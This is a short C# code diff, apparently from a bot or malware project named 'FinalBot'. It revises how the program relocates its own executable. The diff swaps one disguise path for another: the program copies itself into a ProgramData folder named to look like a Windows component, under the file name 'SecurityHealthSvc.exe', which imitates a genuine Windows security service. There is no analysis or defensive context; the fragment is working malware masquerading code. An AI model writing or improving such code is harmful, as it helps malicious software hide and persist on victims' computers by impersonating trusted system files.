@@ -16,11 +16,9 @@ namespace FinalBot
                 string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                 if (string.IsNullOrEmpty(selfPath)) return;
 
-                // Stage 1: Legitimate Path Transition (ProgramData)
-                string programData = Environment.GetEnvironmentVariable("ProgramData");
-                if (string.IsNullOrEmpty(programData)) programData = @"C:\ProgramData";
-                string targetDir = Path.Combine(programData, "Microsoft", "Windows", "SystemData");
-                string targetPath = Path.Combine(targetDir, "SecurityHealthHost.exe");
+                string programData = Environment.GetEnvironmentVariable("ProgramData") ?? @"C:\ProgramData";
+                string targetDir = Path.Combine(programData, "Microsoft", "Windows", "Power Efficiency Diagnostics");
+                string targetPath = Path.Combine(targetDir, "SecurityHealthSvc.exe");
 
                 if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
 
